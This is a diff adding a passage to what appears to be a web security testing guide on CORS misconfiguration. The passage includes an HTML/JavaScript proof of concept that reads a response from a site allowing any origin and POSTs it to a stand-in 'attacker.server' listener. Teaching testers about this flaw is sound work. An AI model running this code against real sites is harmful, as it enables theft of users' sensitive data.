@@ -74,6 +74,30 @@ Content-Type: application/xml
 [Response Body]
 ```
 
+If response contains sensitive data, Attacker can steal it by `XMLHttpRequest`. A simple PoC to steal response can be like this:
+
+```html
+<html>
+    <head></head>
+    <body>
+        <script>
+            var xhr = new XMLHttpRequest();
+            xhr.onreadystatechange = function() {
+                if (this.readyState == 4 && this.status == 200) {
+                    var xhr2 = new XMLHttpRequest();
+                    // attacker.server: attacker listener to steal response
+                    xhr2.open("POST", "http://attacker.server", true);
+                    xhr2.send(xhr.responseText);
+                }
+            };
+            // victim.site: vulnerable server with `Access-Control-Allow-Origin: *` header 
+            xhr.open("GET", "http://victim.site", true);
+            xhr.send();
+        </script>
+    </body>
+</html>
+```
+
 #### Dynamic CORS Policy
 
 A modern web application or API may be implemented to allow cross-origin requests dynamically, generally in order to allow the requests from the sub domains like the following:
